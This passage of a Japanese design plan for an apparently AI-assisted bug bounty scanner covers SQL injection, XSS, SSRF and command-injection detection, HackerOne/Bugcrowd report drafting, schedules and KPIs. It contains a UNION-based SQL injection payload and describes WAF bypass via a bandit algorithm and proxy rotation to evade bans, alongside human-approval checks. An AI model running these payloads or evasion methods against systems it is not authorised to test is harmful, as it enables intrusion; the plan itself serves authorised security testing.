            target=finding.target,
            saved_data_pattern=finding.injected_data
        )
        
        return SecondOrderHint(
            confidence=self.calculate_second_order_likelihood(storage_indicators),
            reasoning=self.format_reasoning(finding, storage_indicators, potential_display_endpoints),
            suggested_manual_tests=[
                ManualTestStep(
                    description=f"1. 再度 {finding.endpoint} にペイロドを送信",
                    payload=finding.payload,
                    expected_result="保存成功"
                ),
                ManualTestStep(
                    description="2. 以下のエンドポイントで表示を確認",
                    endpoints=potential_display_endpoints[:5],
                    monitoring_advice="レスポンスにペイロドの痕跡がないか確認"
                ),
                ManualTestStep(
                    description="3. 時間経過後（30秒〜5分）に再確認",
                    reason="遅延処理の可能性"
                )
            ],
            ai_assistance_offered=[
                "自動巡回: 指定エンドポイントを30秒間隔で監視",
                "差分検出: レスポンスの変化を自動検出",
                "OOB監視: DNS/HTTPコールバックを監視"
            ]
        )
    
    async def monitor_for_second_order(self, 
                                       injection_point: Endpoint,
                                       display_endpoints: List[Endpoint],
                                       duration_seconds: int = 300) -> MonitoringResult:
        """人間が手動テスト中、AIが自動監視を実施"""
        start_time = time.time()
        observations = []
        
        while time.time() - start_time < duration_seconds:
            for endpoint in display_endpoints:
                response = await self.http_client.get(endpoint)
                
                if self.payload_traces_found(response, injection_point.payload):
                    observations.append(Observation(
                        timestamp=time.time(),
                        endpoint=endpoint,
                        evidence=response.text[:1000],
                        confidence="high" if self.is_clear_execution(response) else "medium"
                    ))
                    
                    # 人間に即座に通知
                    await self.notify_human(
                        f"Second-Order疑いの痕跡を検出: {endpoint}",
                        observation=observations[-1]
                    )
            
            await asyncio.sleep(30)  # 30秒間隔
        
        return MonitoringResult(
            observations=observations,
            summary=f"{len(observations)}件の疑わしい痕跡を検出"
        )
```

##### D3-2: Evidence Collection Engine

```python
class EvidenceCollector:
    """
    証拠収集とレポート生成を分離（Layer 4分離）
    
    重要注記:
    - 「サンプルデータ抽出」はHITL判断に必須
    - Bug Bountyプログラムの「許可境界」は自動判定不可能（ポリシー依存）
    - `LIMIT 1`でも、テーブル内容によってはスコープ違反になる可能性あり
    - 証拠収集は「存在確認」までとし、データ抽出は人間が判断
    """
    async def collect_evidence(self, finding: Finding) -> Evidence:
        # 証拠収集（存在確認のみ、データ抽出は行わない）
        evidence = Evidence(
            vulnerability_type=finding.type,
            affected_endpoint=finding.endpoint,
            payload_used=finding.payload,
            response_evidence=finding.response[:1000],  # レスポンス一部
            timestamp=datetime.utcnow(),
            reproduction_steps=self.generate_reproduction_steps(finding),
            # データ抽出は行わない（スコープ違反リスク）
            extracted_data=None  # 人間が手動で判断
        )
        
        # HITLにデータ抽出の可否を確認
        if finding.type in ["SQLi", "LFI", "SSRF"]:
            evidence.data_extraction_approved = await self.hitl_engine.request_data_extraction_approval(
                finding=finding,
                reason="Bug Bountyプログラムのスコープ内か確認が必要"
            )
        
        return evidence
```

##### D3-3: Distributed SQLi Guesser

```python
class HeaderCorrelationDetector:
    """
    分散トレース連携ではなく、HTTPヘッダーの相関で推定検出
    """
    async def detect_distributed_sqli(self, entry_endpoint: Endpoint) -> List[DistributedSQLiHint]:
        # ユニーク相関IDを注入
        correlation_id = f"shigoku-{uuid.uuid4().hex[:8]}"
        payload = f"' UNION SELECT '{correlation_id}'-- "
        
        # リクエスト送信（相関IDヘッダー付き）
        initial_response = await self.inject_with_headers(
            entry_endpoint,
            payload=payload,
            headers={
                "X-Shigoku-Correlation-ID": correlation_id,
                "X-Request-ID": correlation_id,
            }
        )
        
        # 他のエンドポイントを巡回し、相関IDの痕跡を検索
        hints = []
        for endpoint in await self.discover_endpoints():
            response = await self.http_client.get(endpoint)
            
            if correlation_id in response.text:
                hints.append(DistributedSQLiHint(
                    entry_point=entry_endpoint,
                    affected_endpoint=endpoint,
                    correlation_id=correlation_id,
                    detection_method="header_correlation",
                    confidence="medium",  # 推定ベースなので中程度
                    evidence=response.text[:500],
                    requires_human_verification=True  # 必ず人間確認
                ))
        
        return hints
```

##### D3-4: Bug Bounty Platform Integration

```python
class HackerOneAPI:
    """HackerOne API連携（下書き作成まで自動化）"""
    async def submit_report_draft(self, finding: Finding) -> ReportResult:
        # レポート下書きを自動生成
        draft = self.generate_report_draft(finding)
        
        # API経由で下書き作成（人間が最終確認・送信）
        result = await self.api.create_draft(
            program_id=finding.program_id,
            title=draft.title,
            summary=draft.summary,
            severity=self.map_severity(finding.severity),  # CVSSベース
            details=draft.details
        )
        
        return ReportResult(
            status="draft_created",
            platform_url=result.url,
            requires_human_review=True,
            note="人間が最終確認の上、送信ボタンを押してください"
        )

class BugcrowdAPI:
    """Bugcrowd API連携（下書き作成まで自動化）"""
    async def submit_submission_draft(self, finding: Finding) -> SubmissionResult:
        draft = self.generate_submission_draft(finding)
        
        result = await self.api.create_submission(
            program_id=finding.program_id,
            title=draft.title,
            description=draft.description,
            severity=self.map_severity(finding.severity)
        )
        
        return SubmissionResult(
            status="draft_created",
            platform_url=result.url,
            requires_human_review=True
        )
```

---

### 3.4 統合スケジュール（Gantt Chart - 改善案統合版）

```
Week 1        Week 2        Week 3        Week 4        Week 5        Week 6
|-------------|-------------|-------------|-------------|-------------|-------------|
[D1-1 Infrastructure Layer]
              [D1-2 Observability]
[D1-3 Resilience]     [D1-4 HITL Strategy]
              [D1-5 Idempotent Invoker]
              
              [====D-1 ゲート====]
              
                            [D2-1 SQLi Engine (統合的手法)]
                            [D2-2 XSS Engine]
                                          [D2-3 WAF Evasion (UCB1)]
                            [D2-4 OOB Engine]
                            [D2-5 Generic Adapter]
                                          [D2-6 Testability+MockWAF]
                                          [D2-7 Proxy Integration]
                                          
                                          [====D-2 ゲート====]
                                          
                                                        [D3-1 Second-Order Asst]?
                                                        [D2-7 Evidence Collec]?
                                                        [D3-3 Distributed Guess]?
                                                        [D3-4 Platform Integr]?
                                                                      [D3-5 Param Discovery]?
                                                                      [D3-6 ML Evasion]? (条件付き)
                                                                      [D3-7 Target Queue]? (条件付き)
```

**変更点（改善案統合）:**
- D1-6 Testability基盤 → D2-6に移動（Behavioral MockWAFと統合）
- D2-1 SQLi Engine → 統合的手法（統計的多手法）に工数増（10h→12h）
- D2-2 XSS Engine → Browser Pool実装追加（メモリリーク対策）
- D2-3 WAF Evasion → MLベースからUCB1に変更（8h→6h）+ ラプラススムージング
- D2-6 MockWAF → ThrottledWAFBehaviorCollector + BinarySearchParamDiscovery追加
- D2-7 Proxy Integration → Phase D-2に前倒し（必須機能）
- D3-1 Second-Order → 人間支援型（12h→8h）
- D3-2 Evidence → スコープ境界注記追加
- D3-3 CI/CD → D3-7 Target Queue Systemに変更（または削除）
- D3-4 Proxy → Phase D-2に移動
- D3-5 Ticket → Bug Bounty Platform Integrationに変更（JIRAはOptional D3-8）

---

### 3.4.1 CTO懸念点と実装対策（PM統合版）

| 懸念点 | 重要度 | 実装対策 | 対象コード | 検証方法 |
|-------|--------|---------|-----------|---------|
| **result_hashのプロセス間変動** | 中 | SHA-256ハッシュ関数を使用（`calculate_sha256_hash`） | D1-3 MetadataCheckpointManager | 複数プロセスで同一ハッシュ値確認 |
| **WebSocket通知不通** | 中 | Email/Slackフォールバック通知（`notify_with_fallback`） | D1-4 HITLDecisionEngine | WebSocket切断シミュレーションでフォールバック動作確認 |
| **ペイロド変動ツールのべき等性** | 中 | ペイロド含むキー + 変動ツール検出（`is_payload_variable_tool`） | D1-5 IdempotentToolInvoker | sqlmap等での重複実行テスト |
| **統合的手法閾値調整** | 中 | `CONSENSUS_THRESHOLDS`設定 + 経騻的チューニング手順 | D2-1 RobustTimeBasedDetector | 5-10件テストケースで閾値検証 |
| **ベースライン環境変動** | 中 | 「同一セッション内」測定制約を明記 | D2-1 RobustTimeBasedDetector | セッション跨ぎ測定の拒否確認 |
| **Cliff's Delta実装** | 低 | `calculate_cliff_delta`メソッド実装 | D2-1 RobustTimeBasedDetector | 効果量計算結果の検証 |
| **ブラウザメモリリーク** | 中 | Browser Pool + 100件ごと再起動（`max_requests_per_browser`） | D2-2 BrowserPool | 長時間負荷テストでメモリ使用確認 |
| **UCB1初期化（0除算）** | 低 | ラプラススムージング（`trials=1, successes=1`） | D2-3 UCB1WAFEvasion | 初期探索動作確認 |
| **WAFデータ収集ブロック** | 中 | スロットリング（5秒間隔）+ 例外ハンドリング | D2-6 ThrottledWAFBehaviorCollector | WAF環境での収集テスト |
| **配列探索リクエスト爆発** | 中 | バイナリサーチ（`BinarySearchParamDiscovery`） | D2-6 AdvancedParamDiscovery | 100→7リクエストに削減確認 |
| **スコープ境界自動判定** | 高 | HITL判断に委任（`data_extraction_approved`） | D3-2 EvidenceCollector | 自動データ抽出が行われない確認 |

**実装対策の詳細:**

1. **SHA-256ハッシュ安定化** (D1-3)
   - `hash()`はプロセス間で変動 → `hashlib.sha256`に置換
   - 衝突確率: 1/2^64（16文字トリム）

2. **フォールバック通知** (D1-4)
   - WebSocket 5秒タイムアウト
   - Email/Slack自動切替
   - 通知到達率100%目標

3. **ペイロド変動対応** (D1-5)
   - ペイロド含むキー: `{tool}:{target}:{param}:{payload_hash}`
   - sqlmap/ghauriは「変動ツール」リスト管理
   - 厳密べき等性は諦め、ベストエフォート

4. **統合的手法閾値** (D2-1)
   - 4手法中3つ以上合意（調整可能）
   - 経騻的チューニング: 5-10件テストケース
   - 閾値は設定ファイルで外部化

5. **ブラウザメモリ管理** (D2-2)
   - プールサイズ: 5
   - 再起動間隔: 100リクエスト
   - Chromiumオプション: `--no-sandbox`, `--disable-dev-shm-usage`

6. **UCB1安定化** (D2-3)
   - ラプラススムージングで0除算回避
   - 楽観的初期化で探索促進

7. **WAF収集スロットリング** (D2-6)
   - 1日1回収集
   - 5秒インターバル
   - WAFブロック時はスキップ

8. **バイナリサーチ探索** (D2-6)
   - 配列インデックス探索: 100→7リクエスト
   - `items[50]`→`items[25]`→...の分割探索

9. **スコープ境界HITL** (D3-2)
   - 自動データ抽出は行わない
   - `LIMIT 1`でもHITL確認
   - 証拠収集は「存在確認」まで

---

### 3.5 リスク管理（統合版 - 改善案反映）

| リスク | 発生確率 | 影響度 | 統合対策 | 責任 | 備考（改善案対応） |
|-------|---------|--------|---------|------|------------------|
| Phase D-1基盤不安定 | 中 | 高 | ゲート判定厳格化、MetadataCheckpointのみ先行的実装 | PM | Checkpointはメタデータのみ、外部ツール内部状態保存は諦め |
| 統計的有意差検定不正確 | 中 | 极高 | 4手法統合、合意ベース判断、アダプティブサンプリング実装 | CTO | 単一検定ではなく複合手法で信頼性確保 |
| Second-Order自動化困難 | 高 | 高 | 人間支援型ハイブリッドに設計変更、AIは支援のみ | CTO | 完全自動化は見送り、人間が判断 |
| MockWAF現実性不足 | 中 | 中 | 実測データ収集パイプライン並行実装 | Debugger | 模擬データではなく実WAF挙動収集 |
| ML Evasion学習失敗 | 中 | 中 | UCB1で代替、深層RLはデータ蓄積後に検討 | CTO | 深層RLはVer.2、UCB1で十分な可能性 |
| スケジュール遅延 | 高 | 中 | Phase D-3を最小実装（D3-1〜D3-5のみ）、Optionalは後回し | PM | 必須機能を絞り込み |
| 技術的負債累積 | 中 | 高 | ADR作成義務化、リファクタリング工数確保 | Architect | 特にAdapterパターンの設計記録 |
| 検出率目標未達 | 中 | 高 | Phase D-3凍結、エンジン調整継続、統合的手法パラメータ調整 | CTO | 閾値調整、検定手法見直し |
| チーム burnout | 低 | 高 | 工数バッファ10%確保、Week 5-6をオプション化 | PM | D3-6〜D3-8は条件付きでスキップ可能 |

---

### 3.6 KPIと成功基準（統合版 - 改善案反映）

| KPI | 目標値 | 測定方法 | 責任 | 備考（改善案対応） |
|-----|--------|---------|------|------------------|
| **Phase D-1通過率** | 100%（全ステージゲート通過） | ゲートレビュー記録 | PM | Checkpointはメタデータのみ、重複実行防止確認 |
| **基盤インフラ安定性** | 100並列でFD枯渇なし | 負荷テスト結果 | SRE | SemaphoreベースConnectionPool動作確認 |
| **再現性率** | 95%+（同じシードで同じ結果） | 10回連続実行テスト | Debugger | seeded_random + ExecutionTracer確認 |
| **拡張性工数** | 新ツール追加<2h、新カテゴリ<8h | 実測 | Architect | YAML定義 + Adapter継承で実現 |
| **検出率** | SQLi 10%+, XSS 15%+ | DVWA/Juice Shop検証 | 実装チーム | 統合的手法（4手法中3つ以上合意）で検出 |
| **統計的有意差合意率** | 90%+（4手法中3つ以上合意） | テストデータ検証 | CTO | 単一手法ではなく複合手法の信頼性 |
| **WAF回避成功率** | 30%+（Cloudflare/AWS各1件以上） | 実環境テスト | 実装チーム | UCB1で実現、深層RLは不要 |
| **HITL通知到達率** | 100% | WebSocket通知テスト | Architect | リアルタイム人間通知確認 |
| **Second-Order候補提示精度** | 高（保存系特定率80%+） | 手動検証結果 | CTO | 人間支援型で実現、完全自動化は見送り |
| **差別化要素完成** | Second-Order支援 + Platform Integration + UCB1 Evasion | 機能動作確認 | CTO | ML統合は条件付き、UCB1で代替 |
| **Bug Bounty報告効率** | プラットフォーム下書き作成まで自動化 | 実際の報告フロー検証 | CTO | HackerOne/Bugcrowd API連携確認 |

## 4. 実行計画サポート（詳細スケジュール）

セクション3の統合実装計画（Phase D-1〜D-3）の詳細スケジュールは、セクション3.4「統合スケジュール（Gantt Chart）」を参照。
本セクションでは、補足情報を記載する。

### 4.1 週次詳細スケジュール（改善案反映版）

| 週 | 主要タスク | 成果物 | レビュー担当 | 備考（改善案統合） |
|---|-----------|--------|-------------|------------------|
| Week 1 | D1-1〜D1-3基盤構築 | Infrastructure Layer、Observability、Resilience (MetadataCheckpoint) | SRE | Checkpointはメタデータのみ |
| Week 2 | D1-4〜D1-5基盤完成 + D-1ゲート | HITL Strategy (WebSocket通知)、Idempotent Invoker | Architect, Debugger | Testability基盤はD2-6に移動 |
| Week 3 | D2-1〜D2-4検出エンジン | SQLi Engine (統合的手法)、XSS Engine、UCB1 WAF Evasion、OOB Engine | CTO | 統計的多手法でTime-based検出 |
| Week 4 | D2-5〜D2-7検出エンジン + D-2ゲート | Generic Adapter、Testability+Behavioral MockWAF、Proxy Integration | PM | MockWAFは実測データベース |
| Week 5-6 | D3-1〜D3-5最小実装 + D3-6〜D3-8条件付き | Second-Order Assistant、Evidence Collection、Platform Integration等 | CTO, PM | ML EvasionはUCB1成功率<30%の場合のみ |

### 4.2 マイルストーンと意思決定ポイント（改善案反映版）

```
Week 2終了時: D-1ゲート
├── 通過 → Week 3開始（D-2へ進行）
└── 不通過 → 残タスクをWeek 3に持ち越し、Phase D-2縮小

Week 4終了時: D-2ゲート（改善案反映）
├── 通過（検出率目標達成 かつ 統計的有意差合意率>90%）
│   → Week 5-6でPhase D-3最小実装（D3-1〜D3-5）
│   → UCB1成功率<30%の場合のみD3-6（ML Evasion）検討
├── 不通過（検出率未達） → Phase D-3凍結、統合的手法パラメータ調整継続
└── 部分通過 → D3-4（Platform Integration）のみ実装

Week 6終了時: 最終レビュー
├── Phase D-3完了 or 凍結確認
├── 全KPI達成確認（特に統計的有意差合意率、HITL通知到達率）
└── Phase E（次フェーズ）計画策定
    └── Ver.2検討項目: 深層RL、完全自動Second-Order、CI/CD統合
```

### 4.3 チーム編成と責任

| ロール | 担当フェーズ | 責任範囲 |
|-------|-------------|---------|
| **PM** | 全フェーズ | スケジュール管理、ステージゲート判定、リスク管理 |
| **SRE** | D-1, D-2, D-3 | インフラ基盤、可観測性、回復性、分散SQLi |
| **Architect** | D-1, D-2, D-3 | モジュール設計、拡張性、CI/CD、Proxy/Ticket統合 |
| **Debugger/QA** | D-1, D-2 | テスト基盤、決定性確保、リプレイ機能 |
| **CTO** | D-2, D-3 | 差別化要素、ML統合、技術戦略判断 |

## 5. KPIと成功基準

| 指標 | 目標値 | 測定方法 |
|-----|--------|---------|
| **P0カテゴリ検出率** | SQLi: 10%+, SSRF: 5%+ | 検出数/テスト対象数 |
| **P1カテゴリ検出率** | XSS: 15%+, Cmd Inj: 3%+ | 検出数/テスト対象数 |
| **再現性率** | 85%+ | 手動検証成功/AI検出 |
| **誤検出率** | <15% | 手動検証失敗/AI検出 |
| **新規カテゴリ開拓** | 2+ カテゴリ/Week | 初検出カテゴリ数 |
| **HITL介入率** | 20-30% | 人間判断必要/総検出 |

### 4.3 リスクと対策

| リスク | 影響 | 確率 | 対策 |
|-------|------|------|------|
| **WAFブロック継続** | 検出不能 | 中 | レート制限、プロキシローテーション、Tamper適用 |
| **誤検出増加** | 手動工数増 | 中 | FindingValidator強化、信頼度スコアリング |
| **OOB検出失敗** | 盲検漏れ | 中 | 複数OOBサービス並行、フォールバック設計 |
| **実行時間増大** | コスト増 | 高 | 並列処理、タイムアウト調整、優先度スキップ |
| **ターゲット依存失敗** | 汎用性低下 | 低 | 段階的フォールバック、人間介入設計 |
| **レート制限BAN** | 停止 | 中 | 遅延増加、単一スレッド切替、プロキシ変更 |

#### 4.3.1 各専門家観点からの懸念点と対応策

##### SRE/インフラエンジニア観点

| 懸念点 | リスク内容 | 対応策 | 実装要件 |
|-------|-----------|--------|---------|
| **分散トレースの非現実性** | Jaeger/Zipkin連携は対象で有効化されている確率が低い | 代替として「サービス間呼び出しパターン分析」で推定検出。HTTPヘッダー（X-Internal-Service等）の相関で推定 | 推定ロジック追加 |
| **OOBサーバーリソース圧迫** | 60秒待機 × 数百パラメータでメモリリスク | TTL付きクリーンアップ、非同期イベント駆動アーキテクチャ。タイムアウト動的調整（混雑時は30秒短縮） | タイムアウト設定、ガベージコレクション |
| **IPローテーションコスト** | WAF回避のプロキシプール管理コスト | コストベース回転戦略。無料/低コストプロキシ優先、高価値ターゲットのみ有料プール使用 | コスト追跡モジュール |
| **統計処理負荷** | CryptoAwareDetectionの複数回測定でレイテンシ増大 | ベースラインキャッシュ（同一セッション内）、非並列測定の並列化（アイソレーション確保下） | キャッシュ層追加 |

##### ソフトウェアアーキテクト観点

| 懸念点 | リスク内容 | 対応策 | 実装要件 |
|-------|-----------|--------|---------|
| **WAF_PROFILES保守コスト** | ハードコードされたWAFプロファイルは陳腐化リスク | 外部YAML設定化 + コミュニティ共有メカニズム。GitHub Gist/リポジトリ連携で自動更新 | 設定ローダー実装 |
| **コンテキスト型のテスト網羅性** | 新コンテキスト追加時の回帰テスト不足 | プロパティベーステスト導入。Hypothesisライブラリで全コンテキスト型×ペイロードの網羅的検証 | PBTテストスイート |
| **Second-Orderステート管理** | ステートフル検出のスケール時メモリ設計不明 | TTL付きRedisバックエンド導入。デフォルトTTL=1時間、検出成功時は永続化 | Redis統合 |
| **EscalationWorkflow主観的閾値** | `score 5以上`の判定基準に統計的根拠なし | 過去Bug Bounty報告データ分析で閾値裏付け。HackerOne APIデータで教師あり学習 | MLモデル（軽量） |

##### デバッガー/品質保証観点

| 懸念点 | リスク内容 | 対応策 | 実装要件 |
|-------|-----------|--------|---------|
| **指紋クエリの失敗モード** | Aurora/RDS特有クエリが存在しない場合の例外 | フォールバック戦略: 標準クエリ→簡易クエリ→単純なバージョン文字列マッチング | 例外ハンドラ强化 |
| **大量テーブルタイムアウト** | `SELECT * LIMIT 1` が大容量テーブルでタイムアウト | 段階的アプローチ: COUNT→sample→full。ステートメントタイムアウト5秒設定 | タイムアウト制御 |
| **トークンリフレッシュ競合** | 並行リクエストでのリフレッシュ競合 | リフレッシュロック機制: asyncio.Lock()で排他制御、リフレッシュ中は他リクエスト待機 | ロック機制実装 |
| **OOBコールバック損失** | タイムアウト後のコールバックで相関ID消失 | グレース期間設計: TTL+30秒延長、デバッグログにDNSクエリ/HTTPリクエスト詳細記録 | ログ強化 |

##### CTO/経営観点

| 懸念点 | リスク内容 | 対応策 | 実装要件 |
|-------|-----------|--------|---------|
| **技術負債リスク** | 12改善案同時実装でコードベース複雑化 | 段階的実装: Phase D-1（P0: 3項目）、Phase D-2（P1: 4項目）に分割 | リリース計画分割 |
| **コンプライアンス境界** | `extract_sample_data` がスコープ/許可超過の可能性 | データ抽出前の「許可境界チェック」自動化。Bug Bountyプログラム規約との照合 | コンプライアンスモジュール |
| **メンテナンス陳腐化** | WAFプロファイル、DB指紋クエリの頻繁な陳腐化 | GitHub Actions自動更新。週次でコミュニティPR監視、月次で自動統合テスト | CI/CDパイプライン |
| **リソース配分最適化** | 全実装 vs 選択実装の判断 | ROIベース段階的投資: Phase D-1で検証→成功時のみPhase D-2実行。失敗時は方向転換 | ステージゲート判定 |

#### 4.3.2 段階的実装計画（CTO推奨）

```
┌─────────────────────────────────────────────────────────────┐
│                    Phase D-1: 基盤完成（Week 1-2）         │
├─────────────────────────────────────────────────────────────┤
│  対象: P0改善案3項目（18時間）                               │
│  ├── AdaptiveWAFEvasion（6h）                               │
│  ├── AutomatedEvidenceCollector（8h）                       │
│  └── AuthAwareHTTPClient（4h）                              │
├─────────────────────────────────────────────────────────────┤
│  検証基準:                                                   │
│  - WAF環境での検出率向上（対象: Cloudflare/AWS WAF各1件）    │
│  - 証拠自動収集で報告工数60%削減確認                        │
│  - 長時間スキャン（30分+）で認証維持率95%+                  │
└─────────────────────────────────────────────────────────────┘
                              ↓ 成功時
┌─────────────────────────────────────────────────────────────┐
│                    Phase D-2: 拡張（Week 3-4）               │
├─────────────────────────────────────────────────────────────┤
│  対象: P1改善案4項目（22時間）                               │
│  ├── AdvancedParamDiscovery（6h）                           │
│  ├── OOBCorrelationManager（6h）                            │
│  ├── ContextAwarePayloadGenerator（4h）                     │
│  └── SecondOrderSQLiDetector（8h）                          │
├─────────────────────────────────────────────────────────────┤
│  P3項目はPhase D-3として別計画化:                          │
│  - DistributedSQLiDetector（12h）                           │
│  - CryptoAwareDetection（4h）                               │
│  - EscalationWorkflow（6h）                                 │
│  - SideEffectBasedDetection（4h）                           │
└─────────────────────────────────────────────────────────────┘
```

#### 4.3.3 ステージゲート判定基準

| ステージ | 判定タイミング | 継続条件 | 中止/転換条件 |
|---------|---------------|---------|--------------|
| **Phase D-1完了** | Week 2終了時 | 3項目全て検証基準達成 | 2項目以上失敗時: 設計見直し |
| **Phase D-2開始** | D-1完了+1日 | D-1成功確認 | - |
| **Phase D-2完了** | Week 4終了時 | 2項目以上達成 | 全項目失敗時: P3項目却下検討 |
| **Phase D-3検討** | D-2完了後 | D-2成功かつリソース有余 | D-2失敗時: D-3凍結 |

#### 4.3.4 ソフトウェアアーキテクト観点：致命的設計問題と改善案

##### モジュール結合度の致命的問題

| 問題点 | 現状設計の致命的欠陥 | 発生する破滅的シナリオ | 改善案 |
|-------|-------------------|----------------------|--------|
| **Adapter間密結合** | `AdvancedParamDiscovery`が6つのアダプターを直接インスタンス化 | 1つのアダプター変更で全体再ビルド必要。テスト時に全アダプターの実依存が必要 | **DIコンテナ導入**: `DiscoveryRegistry`に登録制。Factoryパターンで遅延バインディング |
| **結果オブジェクトの具象依存** | `Finding`クラスが具象型（`SQLiFinding`, `XSSFinding`等）で分離 | 新カテゴリ追加時に既存レポーター・デデュplicator全改修 | **Visitorパターン**: `FindingVisitor`で型安全な処理。Open/Closed原則遵守 |
| **レイヤー間直接参照** | Layer 1→2→3で直接メソッド呼び出し | Layer 2変更時にLayer 1,3両方に影響。リファクタリング不可 | **メディエーターパターン**: `DetectionOrchestrator`が唯一の結合点。各LayerはOrchestratorのみ参照 |
| **設定の分散** | WAF_PROFILES、PAYLOAD_TEMPLATES等が各クラスにハードコード | 設定変更の追跡不能。一貫性喪失 | **Centralized Config + Validation**: Pydantic設定モデル。変更追跡・バリデーション統一 |

##### 拡張性の致命的問題

| 問題点 | 現状設計の致命的欠陥 | 発生する破滅的シナリオ | 改善案 |
|-------|-------------------|----------------------|--------|
| **新検出カテゴリ追加の侵入的変更** | `Tier 1/2`テーブルに列追加、HITL判定ロジック改修、Reportフォーマット改修 | 新カテゴリ（e.g., GraphQL Injection）追加に5ファイル改修・2週間工数 | **Plugin Architecture**: `DetectionPlugin`インターフェース。新カテゴリは単一ファイルで自己完結 |
| **ツール追加の_ADAPTER改修必須** | sqlmap, dalfox等追加時に`*_adapter.py`新規作成 | 10ツールで10アダプター。共通ロジック重複・メンテナンス爆発 | **Generic Tool Adapter**: `SubprocessToolAdapter`基底。ツール固有部分のみYAML/JSON定義 |
| **HITLポイント増加の設計限界** | 人間介入ポイントが増えると`if/else`地獄 | 10ポイントで判定ロジック100行+。可読性喪失・バグ温床 | **HITL Strategy Pattern**: `HITLDecisionEngine`にStrategy登録。動的ルーティング |
| **OOBサービス切替の影響範囲** | interactsh切替時に`OOBCorrelationManager`改修 | 切替1回でコア改修。回帰テスト必須 | **OOB Provider Interface**: `OOBProvider`抽象。interactsh/自前/burpcollaborator等を設定切替 |

##### 既存ツールチェーン統合の致命的問題

| 問題点 | 現状設計の致命的欠陥 | 発生する破滅的シナリオ | 改善案 |
|-------|-------------------|----------------------|--------|
| **Caido/Burp連携のAdaptor未設計** | 計画書にProxy連携の設計記述なし | 手動でRepeaterにコピー→再現性喪失。プロキシログとの相関手作業 | **Proxy Adapter Interface**: `ProxyIntegration`基底。Caido MCP/Burp Extension API連携。検出時に自動的にProxyに送信 |
| **CI/CDパイプライン埋め込み不可** | ローカル実行前提。Jenkins/GitHub Actions統合設計なし | 自動化できず、夜間スキャン未実現。人的リソース枯渇 | **Headless Mode + Webhook**: 設定ファイル駆動。結果をwebhook送信。Dockerイメージ化 |
| **既存スキャナー（Nuclei等）結果統合不可** | 自前検出結果とNuclei結果が別システム | 二重管理・優先度判断分散。重複報告・見逃し | **Unified Finding Model**: Nuclei JSON結果を`Finding`に変換。統一レポート生成 |
| **JIRA/Trello等チケット連携なし** | 報告まで自動化、以降手動 | 100検出時の管理工数爆発。追跡漏れ・重複作業 | **Ticket Integration Interface**: `TicketProvider`抽象。JIRA/Linear/GitHub Issues自動作成 |

##### 設計ドキュメント化不足の致命的問題

| 問題点 | 現状設計の致命的欠陥 | 発生する破滅的シナリオ | 改善案 |
|-------|-------------------|----------------------|--------|
| **アーキテクチャ決定記録（ADR）なし** | Layered Detection設計の意思決定背景が文書化されていない | 6ヶ月後に「なぜLayer 4まで？」判断不可。不要設計が残るか過度なリファクタリング | **ADR-007「SQLi検出レイヤー設計」**: 決定・代替案・トレードオフ・根拠を記録 |
| **コンポーネント図の陳腐化** | テキスト記述のみ（コードブロック）。自動生成されない | 実装と図の乖離。新メンバー誤認識・不正確な設計判断 | **自動生成**: `pyreverse`/`plantuml`でCI自動生成。図とコード同期 |
| **インターフェース契約未定義** | `Finding`のフィールド仕様が暗黙知 | レポーターと検出モジュールでデータ競合。NoneTypeエラー頻発 | **OpenAPI/JSON Schema**: `Finding`スキーマ厳密定義。バリデーション自動化 |
| **テスト戦略の欠如** | 工数表にテスト工数0 | 実装完了後に品質担保不可。リグレッションリスク | **テスト工数追加**: 単体30%、統合20%、E2E 10%。TDDで品質担保 |


### 4.4 実装時判断基準（動的優先度調整）

**基本方針**: ROI最大化のため、進捗に応じて優先度を動的に調整

| 優先度 | 項目 | 判断タイミング | 成功基準 | 失敗時の代替策 |
|--------|------|---------------|---------|--------------|
| P0 | **SSRF OOB連携** | Week 1 Day 2 | interactshで相関検出成功 | 代替OOBサービス切替 |
| P1 | **Time-based SQLi** | Week 1 Day 4 | 応答時間変化検出 | Boolean-basedへ切替 |
| P2 | **DOM XSS** | Week 1 Day 5 | DalFox統合成功 | Reflected/Stored優先化 |
| P3 | **Cmd Injection** | Week 2 Day 3 | OOBコールバック検出 | Time-based遅延検出へ |
| P4 | **WAF対策** | 継続 | レート制限回避確認 | 単一スレッド・高遅延へ |

**動的調整フロー**:
```
Week 1: 高ROIカテゴリ集中（SSRF/SQLi）
  ├─ SSRF OOB成功 → 深堀（プロトコルスマuggling）
  ├─ SSRF失敗 → SQLiリソース増配分
  └─ SQLi Error-based成功 → Time-based試行

Week 2: 広域カバー（XSS/Cmd Inj/Auth）
  ├─ XSS DOM成功 → Stored試行
  ├─ Cmd Inj OOB成功 → 深堀（RCE検証）
  └─ 全カテゴリ基盤完成 → 自動化強化
```

## 5. 検証計画

### 5.1 単体テスト

```python
# tests/core/adapters/external/test_sqlmap_adapter.py
- test_error_based_detection()
- test_time_based_detection()
- test_union_based_extraction()
- test_waf_evasion_tamper()

# tests/core/adapters/external/test_dalfox_adapter.py
- test_reflected_xss_detection()
- test_dom_xss_detection()
- test_waf_delay_handling()

# tests/core/agents/swarm/injection/test_ssrf_hunter.py
- test_oob_correlation_detection()
- test_protocol_smuggling_detection()

# tests/core/agents/swarm/injection/test_cmd_injection_hunter.py
- test_oob_command_execution()
- test_time_based_command_detection()
```

### 5.2 統合テスト

```python
# tests/core/engine/test_injection_manager_routing.py
- test_specialist_auto_invocation_by_category()
- test_specialist_auto_invocation_by_pattern()
- test_waf_detection_and_evasion()

# tests/core/validation/test_finding_validator.py
- test_confidence_scoring()
- test_hitl_queue_integration()
- test_false_positive_filtering()
```

### 5.3 E2E検証（実環境テスト）

| ターゲット | 検証内容 | 成功基準 |
|---------|---------|---------|
| **DVWA** | SQLi全レベル検出 | Error/Time/Union検出 |
| **Juice Shop** | XSS/NoSQLi検出 | Stored/DOM/NoSQLi検出 |
| **WebGoat** | Auth/SSRF検出 | JWT問題/SSRF検出 |
| **PortSwigger Academy** | カテゴリ網羅 | 各ラボ1件以上検出 |

### 5.4 パフォーマンステスト

```python
# tests/performance/test_detection_throughput.py
- test_high_volume_param_discovery()
- test_waf_throttling_recovery()
- test_concurrent_specialist_execution()
```

## 6. 実装履歴・戦略決定事項

### 6.1 計画策定時決定事項

| 日付 | 決定事項 | 成果物 | 理由 |
|------|---------|--------|------|
| 2026-05-22 | ROI優先カテゴリ選定 | セクション2.1 ROIランキング | 報酬期待値順に資源配分 |
| 2026-05-22 | 多層検出アーキテクチャ採用 | Layer 1-4構成 | 段階的深堀で効率化 |
| 2026-05-22 | FOSSツール優先戦略 | sqlmap/dalfox/nosqli選定 | 実装コスト削減、成熟ツール活用 |
